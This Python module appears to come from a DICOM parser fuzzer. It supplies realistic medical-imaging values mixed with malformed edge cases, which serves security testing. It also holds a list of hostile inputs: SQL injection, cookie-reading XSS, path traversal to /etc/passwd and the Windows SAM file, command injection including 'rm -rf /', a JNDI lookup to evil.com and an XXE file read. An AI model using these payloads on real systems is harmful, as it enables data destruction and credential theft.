"""DICOM-Specific Value Dictionaries for Intelligent Fuzzing.

Uses real DICOM values to bypass input validation and reach deeper code paths.
"""

import random
import time

# DICOM Transfer Syntax UIDs - define encoding (compression, etc.)
TRANSFER_SYNTAXES = [
    # Uncompressed
    "1.2.840.10008.1.2",  # Implicit VR Little Endian (default)
    "1.2.840.10008.1.2.1",  # Explicit VR Little Endian
    "1.2.840.10008.1.2.2",  # Explicit VR Big Endian (retired)
    # JPEG Compression
    "1.2.840.10008.1.2.4.50",  # JPEG Baseline (Process 1)
    "1.2.840.10008.1.2.4.51",  # JPEG Extended (Process 2 & 4)
    "1.2.840.10008.1.2.4.57",  # JPEG Lossless
    "1.2.840.10008.1.2.4.70",  # JPEG Lossless (First-Order Prediction)
    "1.2.840.10008.1.2.4.80",  # JPEG-LS Lossless
    "1.2.840.10008.1.2.4.81",  # JPEG-LS Lossy
    "1.2.840.10008.1.2.4.90",  # JPEG 2000 Lossless
    "1.2.840.10008.1.2.4.91",  # JPEG 2000 Lossy
    # RLE Compression
    "1.2.840.10008.1.2.5",  # RLE Lossless
    # MPEG Compression
    "1.2.840.10008.1.2.4.100",  # MPEG2 Main Profile @ Main Level
    "1.2.840.10008.1.2.4.101",  # MPEG2 Main Profile @ High Level
    "1.2.840.10008.1.2.4.102",  # MPEG-4 AVC/H.264 High Profile
    "1.2.840.10008.1.2.4.103",  # MPEG-4 AVC/H.264 BD-compatible High Profile
    # Deflate
    "1.2.840.10008.1.2.1.99",  # Deflated Explicit VR Little Endian
]

# SOP Class UIDs (Service-Object Pair)
SOP_CLASS_UIDS = [
    # Computed Radiography
    "1.2.840.10008.5.1.4.1.1.1",  # CR Image Storage
    # CT
    "1.2.840.10008.5.1.4.1.1.2",  # CT Image Storage
    "1.2.840.10008.5.1.4.1.1.2.1",  # Enhanced CT Image Storage
    # MRI
    "1.2.840.10008.5.1.4.1.1.4",  # MR Image Storage
    "1.2.840.10008.5.1.4.1.1.4.1",  # Enhanced MR Image Storage
    # Ultrasound
    "1.2.840.10008.5.1.4.1.1.6.1",  # Ultrasound Image Storage
    "1.2.840.10008.5.1.4.1.1.6.2",  # Enhanced US Volume Storage
    # X-Ray
    "1.2.840.10008.5.1.4.1.1.12.1",  # X-Ray Angiographic Image Storage
    "1.2.840.10008.5.1.4.1.1.12.2",  # X-Ray Radiofluoroscopic Image Storage
    # Nuclear Medicine
    "1.2.840.10008.5.1.4.1.1.20",  # Nuclear Medicine Image Storage
    # PET
    "1.2.840.10008.5.1.4.1.1.128",  # Positron Emission Tomography Image Storage
    # Secondary Capture
    "1.2.840.10008.5.1.4.1.1.7",  # Secondary Capture Image Storage
    "1.2.840.10008.5.1.4.1.1.7.4",  # Multi-frame True Color SC Image Storage
    # Radiation Therapy
    "1.2.840.10008.5.1.4.1.1.481.2",  # RT Dose Storage
    "1.2.840.10008.5.1.4.1.1.481.3",  # RT Structure Set Storage
    # Segmentation
    "1.2.840.10008.5.1.4.1.1.66.4",  # Segmentation Storage
    # Encapsulated Documents
    "1.2.840.10008.5.1.4.1.1.104.1",  # Encapsulated PDF Storage
    # Structured Reports
    "1.2.840.10008.5.1.4.1.1.88.11",  # Basic Text SR Storage
    "1.2.840.10008.5.1.4.1.1.88.22",  # Enhanced SR Storage
    # Presentation States
    "1.2.840.10008.5.1.4.1.1.11.1",  # Grayscale Softcopy Presentation State
    # Raw Data
    "1.2.840.10008.5.1.4.1.1.66",  # Raw Data Storage
]

# Modality Codes
MODALITY_CODES = [
    "CR",  # Computed Radiography
    "CT",  # Computed Tomography
    "MR",  # Magnetic Resonance
    "US",  # Ultrasound
    "XA",  # X-Ray Angiography
    "RF",  # Radiofluoroscopy
    "DX",  # Digital Radiography
    "MG",  # Mammography
    "PT",  # Positron Emission Tomography
    "NM",  # Nuclear Medicine
    "ES",  # Endoscopy
    "OP",  # Ophthalmic Photography
    "OT",  # Other
    "SC",  # Secondary Capture
    "SR",  # Structured Report
    # Edge cases for fuzzing
    "XX",  # Invalid modality
    "",  # Empty string
    "A" * 20,  # Too long
]

# Patient Sex Codes
PATIENT_SEX_CODES = [
    "M",  # Male
    "F",  # Female
    "O",  # Other
    "",  # Unknown
    # Edge cases
    "X",  # Invalid
    "MALE",  # Wrong format
    "m",  # Lowercase
]

# Institution Names (realistic hospitals)
INSTITUTION_NAMES = [
    "Massachusetts General Hospital",
    "Johns Hopkins Hospital",
    "Mayo Clinic",
    "Cleveland Clinic",
    "UCLA Medical Center",
    "Stanford Health Care",
    "UCSF Medical Center",
    "NewYork-Presbyterian Hospital",
    "Cedars-Sinai Medical Center",
    "Mount Sinai Hospital",
    # Edge cases for fuzzing
    "A" * 256,  # Very long name
    "",  # Empty
    "Hospital\x00Name",  # Null byte injection
    "Hospital'; DROP TABLE patients; --",  # SQL injection attempt
    "<script>alert('xss')</script>",  # XSS attempt
]

# Manufacturer Names
MANUFACTURER_NAMES = [
    "GE Healthcare",
    "Siemens Healthineers",
    "Philips Healthcare",
    "Canon Medical Systems",
    "Fujifilm Medical Systems",
    "Hologic",
    "Carestream Health",
    "Agfa Healthcare",
    # Edge cases
    "Unknown",
    "",
    "A" * 64,
]

# Photometric Interpretation Values
PHOTOMETRIC_INTERPRETATION = [
    "MONOCHROME1",  # Min value = white
    "MONOCHROME2",  # Min value = black
    "PALETTE COLOR",  # Palette color
    "RGB",  # Red-Green-Blue
    "YBR_FULL",  # YCbCr Full
    "YBR_FULL_422",  # YCbCr Full 4:2:2
    "YBR_PARTIAL_422",  # YCbCr Partial 4:2:2
    "YBR_ICT",  # YCbCr ICT (JPEG 2000)
    "YBR_RCT",  # YCbCr RCT (JPEG 2000)
    # Edge cases
    "INVALID",
    "",
    "RGB\x00",  # Null byte
]

# Common DICOM Date Formats (YYYYMMDD)
SAMPLE_DATES = [
    "20240101",  # Valid date
    "20231231",  # End of year
    "19700101",  # Unix epoch
    "99991231",  # Far future
    # Edge cases
    "00000000",  # All zeros
    "20240230",  # Invalid date (Feb 30)
    "20241301",  # Invalid month
    "2024010",  # Too short
    "202401011",  # Too long
    "",  # Empty
    "ABCD1234",  # Invalid characters
]

# Common DICOM Time Formats (HHMMSS.FFFFFF)
SAMPLE_TIMES = [
    "120000",  # Noon
    "000000",  # Midnight
    "235959",  # End of day
    "120000.000000",  # With microseconds
    # Edge cases
    "240000",  # Invalid hour
    "126000",  # Invalid minute
    "120060",  # Invalid second
    "12",  # Too short
    "",  # Empty
]

# Patient Names (in DICOM format: LastName^FirstName^MiddleName^Prefix^Suffix)
SAMPLE_PATIENT_NAMES = [
    "Doe^John",
    "Smith^Jane^Marie",
    "Johnson^Robert^Lee^Dr",
    "Williams^Mary^Ann^^Jr",
    # Edge cases
    "^",  # Only delimiter
    "A" * 256,  # Very long
    "",  # Empty
    "O'Brien^Patrick",  # Apostrophe
    "Müller^Hans",  # Unicode
    "Name\x00^First",  # Null byte
]

# Study Descriptions
STUDY_DESCRIPTIONS = [
    "CT HEAD W/O CONTRAST",
    "MRI BRAIN W/ & W/O CONTRAST",
    "CHEST 2 VIEWS",
    "ABDOMEN PELVIS W/ CONTRAST",
    "SPINE LUMBAR W/O CONTRAST",
    "ULTRASOUND ABDOMEN COMPLETE",
    "MAMMOGRAM BILATERAL",
    "X-RAY HAND 3 VIEWS",
    # Edge cases
    "",
    "A" * 256,
    "Study<script>alert(1)</script>",
]

# Accession Numbers (hospital-specific identifiers)
SAMPLE_ACCESSION_NUMBERS = [
    "ACC12345678",
    "20240101-001",
    "HOSP-2024-12345",
    # Edge cases
    "",
    "A" * 64,
    "123",
    "ACC\x0012345",
]

# Patient ID formats
SAMPLE_PATIENT_IDS = [
    "1234567890",
    "PAT-2024-001",
    "MRN123456",
    # Edge cases
    "",
    "000000000",
    "A" * 64,
    "123\x00456",
]

# Pixel Spacing values (physical distance between pixels in mm)
# Format: [row spacing, column spacing]
PIXEL_SPACING_VALUES = [
    "1.0\\1.0",  # 1mm x 1mm
    "0.5\\0.5",  # 0.5mm x 0.5mm (high res)
    "0.1\\0.1",  # Very high res
    "2.0\\2.0",  # Low res
    # Edge cases
    "0\\0",  # Zero spacing (divide by zero risk!)
    "-1.0\\-1.0",  # Negative spacing
    "1000\\1000",  # Huge spacing
    "abc\\xyz",  # Invalid
    "",  # Empty
    "1.0",  # Missing delimiter
]

# Window Center/Width for display (brightness/contrast)
WINDOW_CENTER_VALUES = [
    "40",  # Typical for CT brain
    "400",  # Typical for CT lung
    "50",  # Typical for CT abdomen
    # Edge cases
    "0",
    "-1024",
    "65535",
    "abc",
    "",
]

WINDOW_WIDTH_VALUES = [
    "80",  # Typical for CT brain
    "1500",  # Typical for CT lung
    "350",  # Typical for CT abdomen
    # Edge cases
    "0",  # Zero width (divide by zero!)
    "-100",  # Negative width
    "100000",  # Huge width
    "abc",
    "",
]

# Character Sets
CHARACTER_SETS = [
    "ISO_IR 100",  # Latin alphabet No. 1
    "ISO_IR 101",  # Latin alphabet No. 2
    "ISO_IR 109",  # Latin alphabet No. 3
    "ISO_IR 110",  # Latin alphabet No. 4
    "ISO_IR 144",  # Cyrillic
    "ISO_IR 127",  # Arabic
    "ISO_IR 126",  # Greek
    "ISO_IR 138",  # Hebrew
    "ISO_IR 148",  # Latin alphabet No. 5
    "ISO_IR 13",  # Japanese (Katakana)
    "ISO_IR 166",  # Thai
    "ISO 2022 IR 6",  # ASCII
    "ISO 2022 IR 87",  # Japanese (Kanji)
    "ISO 2022 IR 149",  # Korean
    "GB18030",  # Chinese
    "UTF-8",  # UTF-8 (modern)
    # Edge cases
    "INVALID",
    "",
    "ISO_IR 999",  # Non-existent
]

# UID Prefixes (organization roots)
COMMON_UID_ROOTS = [
    "1.2.840.10008",  # DICOM Standard
    "1.2.840.113619",  # GE Medical Systems
    "1.3.12.2.1107.5.1",  # Siemens
    "1.2.826.0.1.3680043.2.1143",  # Philips
    "1.2.392.200036.9116",  # Canon
    "1.2.392.200036.9125",  # Fujifilm
    # Edge cases for fuzzing
    "1.2.3",  # Too short
    "999.999.999.999",  # Invalid root
    "",  # Empty
]

# --- Shared attack payloads (used by multiple fuzzers) ---

# Generic injection payloads for security testing.
# Covers SQL, XSS, path traversal, command injection, LDAP/JNDI,
# format strings, template injection, HTTP header injection, XXE.
INJECTION_PAYLOADS: list[str] = [
    # SQL injection
    "'; DROP TABLE patients; --",
    "' OR '1'='1",
    "UNION SELECT * FROM users",
    "admin'--",
    "1' UNION SELECT NULL--",
    "1' OR '1'='1",
    # XSS
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<script>alert(document.cookie)</script>",
    # Path traversal
    "../../etc/passwd",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "C:\\Windows\\System32",
    "\\\\server\\share\\path",
    # Command injection
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(whoami)",
    "; rm -rf /",
    "$(touch /tmp/pwned)",
    # LDAP / JNDI injection
    "${jndi:ldap://evil.com/a}",
    "*)(uid=*))(|(uid=*",
    # Format strings
    "%s%s%s%s%s%s%s%s%s%s",
    "%n%n%n%n%n",
    "%x%x%x%x%x%x%x%x%x%x",
    "%p%p%p%p%p",
    # Template injection
    "{{7*7}}",
    # HTTP header injection
    "\r\nInjected-Header: value",
    # ANSI escape sequences
    "\x1b[31mRED\x1b[0m",
    # XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    # Null byte injection
    "\x00\x00\x00\x00",
    # HTML-encoded XSS
    "&lt;img src=x onerror=alert(1)&gt;",
]

# Integer boundary values as strings (for DICOM string VR fields like IS/DS).
INTEGER_BOUNDARY_STRINGS: list[str] = [
    "0",
    "-1",
    "1",
    "32767",  # INT16_MAX
    "32768",  # INT16_MAX + 1
    "-32768",  # INT16_MIN
    "-32769",  # INT16_MIN - 1
    "65535",  # UINT16_MAX
    "65536",  # UINT16_MAX + 1
    "2147483647",  # INT32_MAX
    "2147483648",  # INT32_MAX + 1
    "-2147483648",  # INT32_MIN
    "-2147483649",  # INT32_MIN - 1
    "4294967295",  # UINT32_MAX
    "4294967296",  # UINT32_MAX + 1
    "18446744073709551615",  # UINT64_MAX
]

# Overlong strings at various lengths for buffer overflow testing.
BUFFER_OVERFLOW_STRINGS: list[str] = [
    "A" * 64,  # Common VR limit
    "A" * 65,  # Just over VR limit
    "A" * 256,
    "A" * 1024,  # 1 KB
    "A" * 10000,  # 10 KB
    "A" * 65536,  # 64 KB
    "A" * 1048576,  # 1 MB
]

# Binary file headers that may be misinterpreted by parsers.
BINARY_FILE_HEADERS: list[bytes] = [
    b"MZ" + b"\x00" * 100,  # PE / Windows executable
    b"\x7fELF" + b"\x00" * 100,  # ELF / Linux executable
    b"PK\x03\x04" + b"\x00" * 100,  # ZIP / JAR archive
    b"%PDF-1.4\n" + b"\x00" * 100,  # PDF document
    b"GIF89a" + b"\x00" * 100,  # GIF image
    b"\x89PNG\r\n\x1a\n" + b"\x00" * 100,  # PNG image
    b"DICM" + b"\x00" * 100,  # Nested DICOM
    b"<?xml version='1.0'?><root></root>",  # XML
    b'{"key": "value", "exploit": true}',  # JSON
    b"#!/bin/bash\nrm -rf /\n",  # Shell script
]


class DICOMDictionaries:
    """Central repository of DICOM-specific dictionaries for intelligent fuzzing.

    Provides access to all DICOM value dictionaries and helper methods for
    generating valid-looking but potentially malicious values.
    """

    # All dictionaries in one place
    ALL_DICTIONARIES: dict[str, list[str]] = {
        "transfer_syntaxes": TRANSFER_SYNTAXES,
        "sop_class_uids": SOP_CLASS_UIDS,
        "modalities": MODALITY_CODES,
        "patient_sex": PATIENT_SEX_CODES,
        "institutions": INSTITUTION_NAMES,
        "manufacturers": MANUFACTURER_NAMES,
        "photometric_interpretations": PHOTOMETRIC_INTERPRETATION,
        "dates": SAMPLE_DATES,
        "times": SAMPLE_TIMES,
        "patient_names": SAMPLE_PATIENT_NAMES,
        "study_descriptions": STUDY_DESCRIPTIONS,
        "accession_numbers": SAMPLE_ACCESSION_NUMBERS,
        "patient_ids": SAMPLE_PATIENT_IDS,
        "pixel_spacings": PIXEL_SPACING_VALUES,
        "window_centers": WINDOW_CENTER_VALUES,
        "window_widths": WINDOW_WIDTH_VALUES,
        "character_sets": CHARACTER_SETS,
        "uid_roots": COMMON_UID_ROOTS,
    }

    @staticmethod
    def get_dictionary(name: str) -> list[str]:
        """Get a dictionary by name.

        Args:
            name: Dictionary name (e.g., 'modalities', 'transfer_syntaxes')

        Returns:
            List of values from that dictionary

        """
        return DICOMDictionaries.ALL_DICTIONARIES.get(name, [])

    @staticmethod
    def get_all_dictionary_names() -> list[str]:
        """Get names of all available dictionaries."""
        return list(DICOMDictionaries.ALL_DICTIONARIES.keys())

    @staticmethod
    def get_random_value(dictionary_name: str) -> str:
        """Get a random value from a dictionary.

        Args:
            dictionary_name: Name of the dictionary

        Returns:
            Random value from that dictionary

        """
        values = DICOMDictionaries.get_dictionary(dictionary_name)
        if not values:
            return ""
        return random.choice(values)

    @staticmethod
    def generate_random_uid(root: str = "1.2.840.10008.5") -> str:
        """Generate a random but valid-looking UID.

        Generates syntactically valid but potentially problematic UIDs.

        Args:
            root: UID root (organization identifier)

        Returns:
            Generated UID string

        """
        # Add timestamp component
        timestamp = int(time.time())

        # Add random component
        random_part = random.randint(1, 999999)

        return f"{root}.{timestamp}.{random_part}"

    @staticmethod
    def get_edge_cases() -> dict[str, list[str]]:
        """Get common edge cases that are useful for fuzzing.

        Returns:
            Dictionary of edge case categories

        """
        return {
            "empty": [""],
            "whitespace": [" ", "\t", "\n", "\r\n", "   "],
            "null_bytes": ["\x00", "text\x00text", "\x00\x00\x00"],
            "very_long": BUFFER_OVERFLOW_STRINGS[:4],
            "special_chars": [
                "'\"",
                "<>",
                "{}",
                "[]",
                "\\",
                "/",
                "://",
                "../",
                "..\\",
            ],
            "sql_injection": [
                p
                for p in INJECTION_PAYLOADS
                if "DROP" in p or "OR '1'" in p or "admin'" in p or "UNION SELECT" in p
            ],
            "xss": [
                p
                for p in INJECTION_PAYLOADS
                if "<script>" in p or "onerror=" in p or "javascript:" in p
            ],
            "format_strings": [
                p
                for p in INJECTION_PAYLOADS
                if p.startswith("%") and not p.startswith("%%")
            ],
            "unicode": ["Ω", "δ", "ñ", "日本語", "🔥", "𝕳𝖊𝖑𝖑𝖔"],
            "numbers_as_strings": [
                "0",
                "-1",
                "999999999",
                "0.0",
                "1e308",
                "NaN",
                "Infinity",
            ],
        }

    @staticmethod
    def get_malicious_values() -> dict[str, list[str]]:
        """Get values specifically designed to trigger vulnerabilities.

        WARNING: These values are intentionally malicious for security testing only!

        Returns:
            Dictionary of malicious value categories

        """
        return {
            "buffer_overflow": [s for s in BUFFER_OVERFLOW_STRINGS if len(s) >= 1024],
            "integer_overflow": [
                s
                for s in INTEGER_BOUNDARY_STRINGS
                if s
                in {
                    "2147483647",
                    "2147483648",
                    "-2147483648",
                    "4294967295",
                    "18446744073709551615",
                }
            ],
            "path_traversal": [
                p
                for p in INJECTION_PAYLOADS
                if "../" in p
                or "..\\" in p
                or p.startswith("/etc")
                or p.startswith("C:\\")
            ],
            "command_injection": [
                p
                for p in INJECTION_PAYLOADS
                if p.startswith("; ")
                or p.startswith("| ")
                or p.startswith("& ")
                or p.startswith("`")
                or p.startswith("$(")
            ],
            "format_string": [
                p
                for p in INJECTION_PAYLOADS
                if p.startswith("%") and not p.startswith("%%")
            ],
            "null_dereference": [
                "\x00" * 100,
                "NULL",
                "null",
                "0x0",
            ],
        }
